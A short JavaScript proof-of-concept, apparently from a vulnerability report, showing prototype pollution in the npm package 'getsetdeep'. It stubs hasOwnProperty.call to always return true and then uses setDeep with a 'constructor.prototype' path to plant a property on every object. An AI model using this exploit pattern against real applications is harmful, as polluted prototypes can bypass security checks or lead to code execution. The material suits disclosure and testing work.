Object.prototype.hasOwnProperty.call = () => true;
const pkg = require('getsetdeep');
let obj = {};
console.log({}.polluted);
pkg.setDeep(obj, 'constructor.prototype.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');